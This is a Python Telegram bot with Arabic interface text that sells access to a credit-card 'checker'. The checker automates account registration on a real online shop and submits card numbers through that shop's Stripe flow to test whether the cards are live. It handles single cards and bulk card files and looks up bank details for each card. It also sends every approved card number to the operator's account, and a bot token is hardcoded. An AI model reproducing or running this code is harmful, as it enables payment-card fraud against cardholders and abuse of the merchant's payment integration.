import telebot
import time
import threading
import cloudscraper
from telebot import types
import requests
import random
import os
import pickle
import re
import json
from bs4 import BeautifulSoup
import string
import uuid
from urllib.parse import urlparse
from datetime import datetime, timedelta

# ==================== ملفات التخزين ====================
POINTS_FILE = "points.json"
BANNED_FILE = "banned.json"
CODES_FILE = "codes.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"

# دالة إنشاء الملف إذا مش موجود
def ensure_file_exists(file_path):
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            json.dump({}, f, indent=4)

# تحميل بيانات النقاط
def load_points():
    ensure_file_exists(POINTS_FILE)
    with open(POINTS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_points(points):
    with open(POINTS_FILE, 'w') as f:
        json.dump(points, f, indent=4)

# تحميل بيانات المحظورين
def load_banned():
    ensure_file_exists(BANNED_FILE)
    with open(BANNED_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_banned(banned):
    with open(BANNED_FILE, 'w') as f:
        json.dump(banned, f, indent=4)

# تحميل بيانات الاشتراكات الزمنية
def load_subscriptions():
    ensure_file_exists(SUBSCRIPTIONS_FILE)
    with open(SUBSCRIPTIONS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_subscriptions(subscriptions):
    with open(SUBSCRIPTIONS_FILE, 'w') as f:
        json.dump(subscriptions, f, indent=4)

def has_active_subscription(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    if user_id_str not in subs:
        return False
    expiry_str = subs[user_id_str]
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        return expiry > datetime.now()
    except:
        return False

def set_subscription(user_id, hours):
    expiry = datetime.now() + timedelta(hours=hours)
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M")
    subs = load_subscriptions()
    subs[str(user_id)] = expiry_str
    save_subscriptions(subs)

# تحميل بيانات الأكواد
def load_codes():
    ensure_file_exists(CODES_FILE)
    with open(CODES_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=4)

def generate_code(hours, target_user_id=None):
    characters = string.ascii_uppercase + string.digits
    code = 'TOME-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4))
    expiry = datetime.now() + timedelta(hours=hours)
    codes = load_codes()
    codes[code] = {
        "hours": hours,
        "target_user": target_user_id,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M"),
        "used": False
    }
    save_codes(codes)
    return code

def redeem_code(code, user_id):
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صحيح"
    code_data = codes[code]
    if code_data["used"]:
        return False, "تم استخدام هذا الكود بالفعل"
    expiry = datetime.strptime(code_data["expiry"], "%Y-%m-%d %H:%M")
    if expiry < datetime.now():
        return False, "انتهت صلاحية الكود"
    target = code_data["target_user"]
    if target is not None and target != user_id:
        return False, "هذا الكود ليس مخصص لك"
    hours = code_data["hours"]
    set_subscription(user_id, hours)
    code_data["used"] = True
    save_codes(codes)
    return True, f"تم تفعيل الاشتراك لمدة {hours} ساعة"

# ==================== دوال النقاط ====================
def has_points(user_id, required=1):
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        return False
    return points[user_id_str] >= required

def deduct_points(user_id, required=1):
    if has_active_subscription(user_id):
        return True
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points or points[user_id_str] < required:
        return False
    points[user_id_str] -= required
    save_points(points)
    return True

def add_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    if user_id_str not in points:
        points[user_id_str] = 0
    points[user_id_str] += amount
    save_points(points)

def set_points(user_id, amount):
    points = load_points()
    user_id_str = str(user_id)
    points[user_id_str] = amount
    save_points(points)

def get_points(user_id):
    points = load_points()
    user_id_str = str(user_id)
    return points.get(user_id_str, 0)

def is_banned(user_id):
    banned = load_banned()
    return str(user_id) in banned

def ban_user(user_id):
    banned = load_banned()
    banned[str(user_id)] = True
    save_banned(banned)

def unban_user(user_id):
    banned = load_banned()
    if str(user_id) in banned:
        del banned[str(user_id)]
        save_banned(banned)

# ========== توكن البوت ==========
token = '8700458805:AAE_arP0RJpTjN_q4fWR258NOwhiS6g9rFs'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ========== ايدي المطور ==========
admin = 1093032296

stop = {}
user_gateways = {}
stop_flags = {}
stopuser = {}
command_usage = {}
active_scans = set()

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))

# ==================== دالة الفحص (بوابة shop.mederikoi.com) ====================
def stripe_checker(ccx):
    """
    فحص بطاقة باستخدام تدفق Stripe من موقع shop.mederikoi.com
    """
    r = requests.Session()
    
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "INVALID_FORMAT"
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    url = "https://shop.mederikoi.com/my-account/"
    pa = urlparse(url)
    urll = f"{pa.scheme}://{pa.netloc}"
    email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
    
    headers = {
        'authority': 'shop.mederikoi.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        response = r.get(f'{urll}/my-account/add-payment-method/', headers=headers)
        if response.status_code != 200:
            return "HTTP_ERROR"
            
        reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg_match:
            return "NONCE_NOT_FOUND"
        reg_nonce = reg_match.group(1)
        
        data = {
            'email': email,
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        
        r.post(f'{urll}/my-account/add-payment-method/', headers=headers, data=data, allow_redirects=True)
        
        response = r.get(f'{urll}/my-account/add-payment-method/', headers=headers)
        
        pk_live = re.search(r'(pk_live_[a-zA-Z0-9]+)', response.text)
        if not pk_live:
            return "PK_LIVE_NOT_FOUND"
        pk_live = pk_live.group(1)
        
        addnonce = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        
        headers_stripe = {
            'authority': 'api.stripe.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={pk_live}'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data)
        
        if 'id' not in response.json():
            return "STRIPE_ERROR"
        payment_id = response.json()['id']
        
        headers_ajax = {
            'authority': 'shop.mederikoi.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_ajax = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        response = r.post(f'{urll}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax)
        
        if 'success":true' in response.text or 'succeeded' in response.text:
            return "APPROVED"
        elif 'declined' in response.text.lower():
            return "DECLINED"
        else:
            return "UNKNOWN_RESPONSE"
            
    except Exception as e:
        return f"ERROR: {str(e)[:50]}"

# ==================== دالة معلومات BIN ====================
def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''• BIN Info : {brand} - {card_type} - {level}
• Bank : {bank} - {country_flag}
• Country : {country_name} [ {country_flag} ]'''
        return mn
    except:
        return 'No info'

# ==================== دالة تنظيم البطاقة ====================
def reg(cc):
    regex = r'\d+'
    matches = re.findall(regex, cc)
    match = ''.join(matches)
    n = match[:16]
    mm = match[16:18]
    yy = match[18:20]
    if yy == '20':
        yy = match[18:22]
        if n.startswith("3"):
            cvc = match[22:26]
        else:
            cvc = match[22:25]
    else:
        if n.startswith("3"):
            cvc = match[20:24]
        else:
            cvc = match[20:23]
    cc = f"{n}|{mm}|{yy}|{cvc}"
    if not re.match(r'^\d{16}$', n):
        return
    if not re.match(r'^\d{3,4}$', cvc):
        return
    return cc

# ==================== أمر start ====================
@bot.message_handler(commands=["start"])
def handle_start(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username
    if is_banned(user_id):
        bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    msg_to_admin = f"🆕 مستخدم جديد دخل البوت!\n👤 الاسم: {first_name}\n🆔 ID: {user_id}\n📛 اليوزر: @{username if username else 'لا يوجد'}"
    bot.send_message(admin, msg_to_admin)
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=f"Hi {name}, Welcome To Stripe Checker\n✅ اشتراكك نشط حتى: {expiry}\n📊 نقاطك: {get_points(user_id)}", reply_markup=mes)
    else:
        bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=f"Hi {name}, Welcome To Stripe Checker\n📊 نقاطك: {get_points(user_id)}\nللحصول على نقاط تواصل مع المالك: @Jo0000ker", reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    user_id = call.from_user.id
    name = call.from_user.first_name
    if is_banned(user_id):
        bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    bot.send_message(call.message.chat.id, f'''- مرحباً بك في بوت فحص Stripe Auth ✅\n\nللفحص اليدوي [/chk] و للكومبو فقط ارسل الملف.\n\nنقاطك الحالية: {get_points(user_id)}\nللحصول على نقاط تواصل مع المالك: @Jo0000ker''')
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Hi {name}, Welcome To Stripe Checker", reply_markup=mes)

# ==================== أمر /cmds ====================
@bot.message_handler(commands=["cmds"])
def admin_commands(message):
    user_id = message.from_user.id
    if user_id != admin:
        if is_banned(user_id):
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
            return
        bot.send_message(chat_id=message.chat.id, text=f'''
📋 أوامر البوت:
• /chk بطاقة|شهر|سنة|cvv - فحص بطاقة
• /mypoints - عرض رصيد نقاطك
• /redeem كود - تفعيل كود اشتراك
• /start - بدء البوت
• /cmds - عرض الأوامر

نقاطك الحالية: {get_points(user_id)}
''')
        return
    commands_text = '''
👑 أوامر المالك 👑

━━━━━━━━━━━━━━━━
📦 أوامر الأكواد والاشتراكات:
• /code عدد_الساعات - إنشاء كود لنفسك
• /code عدد_الساعات user_id - إنشاء كود لمستخدم

━━━━━━━━━━━━━━━━
⭐ أوامر النقاط:
• /addpoints ID عدد - إضافة نقاط
• /rempoints ID عدد - حذف نقاط
• /setpoints ID عدد - تعيين رصيد نقاط
• /points ID - عرض رصيد مستخدم

━━━━━━━━━━━━━━━━
🚫 أوامر الحظر:
• /block ID - حظر مستخدم
• /unblock ID - إلغاء حظر

━━━━━━━━━━━━━━━━
📋 أوامر المستخدمين:
• /mypoints - عرض رصيدك
• /chk بطاقة|شهر|سنة|cvv - فحص بطاقة
• /redeem كود - تفعيل كود اشتراك
• /start - بدء البوت
• /cmds - عرض الأوامر

━━━━━━━━━━━━━━━━
💡 ملاحظة: الاشتراك الزمني يلغي استهلاك النقاط
'''
    bot.send_message(admin, commands_text)

# ==================== أمر /chk ====================
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def my_ali4(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    if not has_points(user_id, 1):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج 1 نقطة لفحص بطاقة.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    try:
        command_usage[user_id]['last_time']
    except:
        command_usage[user_id] = {'last_time': datetime.now()}
    current_time = datetime.now()
    if command_usage[user_id]['last_time'] is not None:
        time_diff = (current_time - command_usage[user_id]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10 - time_diff} seconds.</b>", parse_mode="HTML")
            return
    ko = bot.send_message(message.chat.id, "- Wait checking your card ...").message_id
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!\nPlease ensure you enter the card details in the correct format:\nCard: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    if not deduct_points(user_id, 1):
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="❌ حدث خطأ في خصم النقاط، حاول مرة أخرى.")
        return
    start_time = time.time()
    try:
        command_usage[user_id]['last_time'] = datetime.now()
        last = stripe_checker(cc)
    except Exception as e:
        last = f'Error: {str(e)}'
    if 'APPROVED' in last:
        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
        bot.send_message(admin, admin_notify)
    end_time = time.time()
    execution_time = end_time - start_time
    info = dato(cc[:6])
    if 'APPROVED' in last:
        msg = f'''<b>Approved ✅

• Card : <code>{cc}</code>
• Response : {last}
• Gateway : Stripe auth gate
{info}
• Time : {execution_time:.2f}s
• Bot By : @Jo0000ker</b>'''
    else:
        msg = f'''<b>Declined ❌

• Card : <code>{cc}</code>
• Response : {last}
• Gateway : Stripe auth gate
{info}
• Time : {execution_time:.2f}s
• Bot By : @Jo0000ker</b>'''
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

# ==================== معالجة الملفات ====================
@bot.message_handler(content_types=['document'])
def GTA(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    lines = downloaded.decode('utf-8', errors='ignore').splitlines()
    total_cards = len([line for line in lines if line.strip()])
    if not has_points(user_id, total_cards):
        points = get_points(user_id)
        if has_active_subscription(user_id):
            pass
        else:
            bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج {total_cards} نقطة لفحص هذا الملف.\nللحصول على نقاط تواصل مع @Jo0000ker")
            return
    if user_id in active_scans:
        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت")
        return
    if not deduct_points(user_id, total_cards):
        bot.reply_to(message, "❌ حدث خطأ في خصم النقاط")
        return
    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='Stripe Auth Gate', callback_data='ottpa2')
    bts.add(soso)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
    try:
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        user_id_int = call.from_user.id
        passs = 0
        basl = 0
        filename = f"com{user_id}.txt"
        if user_id_int in active_scans:
            return
        else:
            active_scans.add(user_id_int)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
        try:
            with open(filename, 'r') as file:
                lino = file.readlines()
                total = len(lino)
                stopuser.setdefault(user_id, {})['status'] = 'start'
                for cc in lino:
                    if stopuser.get(user_id, {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Stopped\nApproved: {passs}\nDeclined: {basl}\nTotal: {passs + basl}')
                        return
                    cc = cc.strip()
                    if not cc:
                        continue
                    try:
                        start_time = time.time()
                        last = stripe_checker(cc)
                    except Exception as e:
                        last = "ERROR"
                    if 'APPROVED' in last:
                        name = call.from_user.first_name
                        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
                        bot.send_message(admin, admin_notify)
                    end_time = time.time()
                    execution_time = end_time - start_time
                    if 'APPROVED' in last:
                        passs += 1
                        info = dato(cc[:6])
                        msg = f'''<b>Approved ✅\n\n• Card : <code>{cc}</code>\n• Response : {last}\n• Gateway : Stripe auth gate\n{info}\n• Time : {execution_time:.2f}s\n• Bot By : @Jo0000ker</b>'''
                        bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                    else:
                        basl += 1
                    time.sleep(7)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if user_id_int in active_scans:
                active_scans.remove(user_id_int)
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Completed ✅\nApproved: {passs}\nDeclined: {basl}\nTotal: {passs + basl}\nDev: @Jo0000ker')
        except:
            pass
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id)
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

# ==================== أمر /code ====================
@bot.message_handler(commands=["code"])
def code_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        hours = int(parts[1])
        target_user = None
        if len(parts) >= 3:
            target_user = int(parts[2])
        code = generate_code(hours, target_user)
        if target_user:
            bot.reply_to(message, f"✅ تم إنشاء كود للمستخدم {target_user}\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة")
            try:
                bot.send_message(target_user, f"🎉 تم إنشاء كود اشتراك لك!\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة", parse_mode="HTML")
            except:
                pass
        else:
            bot.reply_to(message, f"✅ تم إنشاء كود لك\n📝 الكود: <code>/redeem {code}</code>\n⏰ صالح لمدة {hours} ساعة", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ: /code عدد_الساعات\nأو /code عدد_الساعات user_id")

# ==================== أمر /redeem ====================
@bot.message_handler(commands=["redeem"])
def redeem(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    try:
        code = message.text.split(' ')[1]
        success, msg = redeem_code(code, user_id)
        if success:
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"✅ {msg}\n📅 ينتهي في: {expiry}\n💡 أثناء الاشتراك لن تستهلك نقاطك", parse_mode="HTML")
        else:
            bot.reply_to(message, f"❌ {msg}", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ: /redeem الكود")

# ==================== أوامر النقاط ====================
@bot.message_handler(commands=["addpoints"])
def add_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        add_points(user_id, amount)
        bot.reply_to(message, f"✅ تم إضافة {amount} نقطة للمستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /addpoints ID عدد")

@bot.message_handler(commands=["rempoints"])
def rem_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        current = get_points(user_id)
        new_amount = max(0, current - amount)
        set_points(user_id, new_amount)
        bot.reply_to(message, f"✅ تم حذف {amount} نقطة من المستخدم {user_id}\nالرصيد الحالي: {get_points(user_id)}")
    except:
        bot.reply_to(message, "❌ خطأ: /rempoints ID عدد")

@bot.message_handler(commands=["setpoints"])
def set_points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = int(parts[2])
        set_points(user_id, amount)
        bot.reply_to(message, f"✅ تم تعيين رصيد {amount} نقطة للمستخدم {user_id}")
    except:
        bot.reply_to(message, "❌ خطأ: /setpoints ID عدد")

@bot.message_handler(commands=["mypoints"])
def my_points_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
        return
    if has_active_subscription(user_id):
        expiry = load_subscriptions().get(str(user_id), "غير معروف")
        points = get_points(user_id)
        bot.reply_to(message, f"💰 لديك اشتراك نشط حتى {expiry}\n📊 نقاطك المحفوظة: {points} نقطة")
    else:
        points = get_points(user_id)
        bot.reply_to(message, f"💰 رصيدك الحالي: {points} نقطة")

@bot.message_handler(commands=["points"])
def points_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        points = get_points(user_id)
        if has_active_subscription(user_id):
            expiry = load_subscriptions().get(str(user_id), "غير معروف")
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة\n✅ لديه اشتراك نشط حتى {expiry}")
        else:
            bot.reply_to(message, f"💰 رصيد المستخدم {user_id}: {points} نقطة")
    except:
        bot.reply_to(message, "❌ خطأ: /points ID")

# ==================== أوامر الحظر ====================
@bot.message_handler(commands=["block"])
def block_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        ban_user(user_id)
        bot.reply_to(message, f"✅ تم حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "🚫 تم حظرك من استخدام هذا البوت.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /block ID")

@bot.message_handler(commands=["unblock"])
def unblock_command(message):
    if message.from_user.id != admin:
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        unban_user(user_id)
        bot.reply_to(message, f"✅ تم إلغاء حظر المستخدم {user_id}")
        try:
            bot.send_message(user_id, "✅ تم إلغاء حظرك، يمكنك استخدام البوت الآن.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ خطأ: /unblock ID")

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)